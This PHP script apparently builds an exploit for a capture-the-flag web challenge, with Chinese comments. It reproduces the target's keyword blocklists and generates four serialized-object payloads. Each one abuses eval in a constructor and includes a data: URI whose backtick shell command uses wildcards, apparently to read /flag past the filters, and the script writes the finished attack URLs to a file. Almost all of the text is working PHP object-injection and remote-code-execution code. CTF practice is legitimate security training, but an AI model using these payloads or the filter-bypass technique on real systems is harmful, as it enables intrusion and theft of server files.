<?php
// 重新分析策略
// __construct中：eval($a.$b) 会执行代码
// __destruct中：$a("", $b) 会调用函数

// 关键：在__construct的eval中就要完成任务
// 并且让$a转为字符串后是一个有效的函数名（或者让check失败从而不执行__destruct）

$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

$pattern_a = '/' . implode('|', array_map(function($item) { return preg_quote($item, '/'); }, $blocked_a)) . '/i';
$pattern_b = '/' . implode('|', array_map(function($item) { return preg_quote($item, '/'); }, $blocked_b)) . '/i';

function check($a, $b, $pattern_a, $pattern_b) {
    if (preg_match($pattern_a, $a)) {
        echo "FAIL: a blocked by: ";
        return false;
    }
    if (preg_match($pattern_b, $b)) {
        echo "FAIL: b blocked\n";
        return false;
    }
    echo "PASS\n";
    return true;
}

echo "=== Strategy: Execute in __construct eval, then die ===\n\n";

// 方案：在eval中执行命令并die，这样__destruct不会被调用
echo "Payload 1: Execute and die immediately\n";
$a1 = ';include("data:,<?=`/???/???%20/????`;?>");die("');
$b1 = '");';

echo "a: $a1\n";
echo "b: $b1\n";
echo "eval result: eval('$a1' . '$b1')\n";
check($a1, $b1, $pattern_a, $pattern_b);

$ser1 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a1) . ':"' . $a1 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b1) . ':"' . $b1 . '";}';
$url1 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser1);
echo "URL: $url1\n\n";

// 方案2：更简单的die
echo "Payload 2: Simple include with die\n";
$a2 = ';include("data:,<?=`/???/???%20/????`;?>");die';
$b2 = '();';

echo "a: $a2\n";
echo "b: $b2\n";
check($a2, $b2, $pattern_a, $pattern_b);

$ser2 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a2) . ':"' . $a2 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b2) . ':"' . $b2 . '";}';
$url2 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser2);
echo "URL: $url2\n\n";

// 方案3：exit
echo "Payload 3: include with exit\n";
$a3 = ';include("data:,<?=`/???/???%20/????`;?>");exit';
$b3 = '();';

echo "a: $a3\n";
echo "b: $b3\n";
check($a3, $b3, $pattern_a, $pattern_b);

$ser3 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a3) . ':"' . $a3 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b3) . ':"' . $b3 . '";}';
$url3 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser3);
echo "URL: $url3\n\n";

// 方案4：使用单引号避免问题
echo "Payload 4: Using single quotes\n";
$a4 = ';include("data:,<?=\\`/???/???%20/????\\`;?>");die();';
$b4 = '//';

echo "a: $a4\n";
echo "b: $b4\n";
check($a4, $b4, $pattern_a, $pattern_b);

$ser4 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a4) . ':"' . $a4 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b4) . ':"' . $b4 . '";}';
$url4 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser4);
echo "URL: $url4\n\n";

file_put_contents('payload_urls2.txt', "Payload 1:\n$url1\n\nPayload 2:\n$url2\n\nPayload 3:\n$url3\n\nPayload 4:\n$url4\n");
echo "URLs saved to payload_urls2.txt\n";
